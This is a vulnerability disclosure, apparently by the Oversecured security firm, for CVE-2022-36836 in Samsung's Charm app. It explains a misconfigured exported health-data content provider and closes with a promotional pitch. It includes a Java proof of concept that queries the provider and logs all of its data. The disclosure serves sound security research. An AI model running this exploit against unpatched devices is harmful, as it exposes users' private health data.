# Details

<table>
    <tr>
        <td>Name</td>
        <td>Charm by Samsung</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.app.scharm</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.15</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.08.02</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36836">CVE-2022-36836</a> (SVE-2022-0926)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$600</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

The provider was declared as follows:
```xml
<provider android:name="com.samsung.android.app.scharm.health.provider.SHealthProvider" android:writePermission="com.samsung.android.app.scharm.permission.WRITE_DATA" android:protectionLevel="signature" android:exported="true" android:authorities="com.samsung.android.app.scharm.health.SHealthProvider" />
```

All write-related methods of this provider are empty, so `android:writePermission` was not used in any way. On the other hand, specifying `android:protectionLevel` is meaningless because this attribute can be specified when declaring permissions but not components. Thus, this setting had no effect and was ignored.

**Proof of Concept**

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Uri uri = Uri.parse("content://com.samsung.android.app.scharm.health.SHealthProvider/");
    dump(uri);
}

public void dump(Uri uri) {
    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
    if (cursor.moveToFirst()) {
        do {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                if (sb.length() > 0) {
                    sb.append(", ");
                }
                sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
            }
            Log.d("evil", sb.toString());
        } while (cursor.moveToNext());
    }
}
```

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.